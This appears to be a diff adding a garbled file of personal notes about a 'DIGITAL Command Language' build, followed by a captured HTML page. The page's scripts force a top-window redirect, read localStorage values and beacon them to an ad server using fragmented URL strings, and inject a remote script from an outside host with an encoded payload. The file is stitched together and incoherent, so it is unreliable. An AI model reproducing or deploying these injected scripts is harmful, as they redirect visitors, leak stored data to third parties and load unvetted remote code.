@@ -1,0 +1,19 @@
+-My build of DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad++ (HTML Editor):
+-Returned:
+-Redirecting to:
+https://tonicdev.com/alph4/5773fccfb5157813007f18e5 :
+<!DOCTYPE html><html><head><!--1154:645--></head><body leftmargin='0' topmargin='0' marginwidth='0' marginheight='0' style='background-color:transparent; width: 100%; text-align: center;'><script>
+var readyStateCheckInterval = setInterval(function() {
+    if (document.readyState === "complete") {
+        top.location.href = ' https://tonicdev.com/alph4/5773fccfb5157813007f18e5 ';
+        clearInterval(readyStateCheckInterval);
+    }
+}, 1);
+</script><script type="text/javascript">var params = {}; var res = [];  try{ if (localStorage!==null && typeof localStorage!==null && typeof localStorage != "undefined" &&  typeof localStorage.SuppCookies != "undefined") params = JSON.parse(localStorage.SuppCookies);}catch(e){}; for (var p in params) res.push(p + "=" + params[p]);new Image().src = "http://n121adserv.com"+"/im"+"pressi"+"on.gif?b=1154"+"&p=645&ch=http%3A%2F%2Fapp.bestpriceninja.com%2Ffo%2Fcountry.js&ad.trans.id=mtmzdxhqr30c&ap=&cps=&c"+"=380&l=ID"+"&h=a62cf839bdb5e06e88156794bc66e2ed&t=1467047033901&s=25b19794c45579c0efe561a6843d1471&tz=&sh=800&sw=1280&"+res.join('&');</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnkQy%2flGX1lW9IEcmTGD%2bgCc4B%2ff3VN0otgd0g4mCfOM4hDltQ6dF1o9EilXFjSReHceJRgSlOntgX%2fXq4V1xaWipgcXWgEce70177SQL6eAQzzUwCM6dcZRzIe8P3OXerzml4a2eQDFwbBLS5jSiTHx48rIywGR6VgM%2fEngNv0ptMlGLLnUC1YZmENRICgMpvj7mRxR8S1Qde9HrDH%2fJNgHwynHcEDL%2bsYfT%2fXohiuqri6SfxWLRbCdjG7uHrhUxgUJ3iht3fenKQYawmkQMwpCVvHwKT%2bhSiCJCcyupOOmLdAFUDZbyYgxF8ncPF4PWllouagYm54JulyDcwTNdfKS6Uov4Uhkn98Rq%2b6yztirfAAWjyS%2fLUb8UXPRTD3RmwBvwnAsueivwxJ%2bpdc0Ug6Rl8eGCOexD1ppR3rg0HgYRZhEZKl6D3%2b4lL3qMpgTGNFb22iyy30FyU%2fXgE%2fU8bN8VEZ3H2W4LrGnPRXO0wBDoiS4jznmuQBBIgAd6f4qPlU0gzswfJ0ebKQHtNo%2f9vB%2fc4rgiIfJD%2bN0dbQwQfq3tzpTkp2r6SOyOT1gFP5lASZZTVO%2bPWTZ0jYvR74hZ4q%2fZAiDP2CUjOhvaI9oTrQFQXtASQO%2fgNtrnaU%2ffSH0IWoT4nyFriuTJG6bIOSVHWCWqiykzJ0vp6WEyo0mXVVEQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
+
+
+-HAR:
+
+-To be evaluated in console:
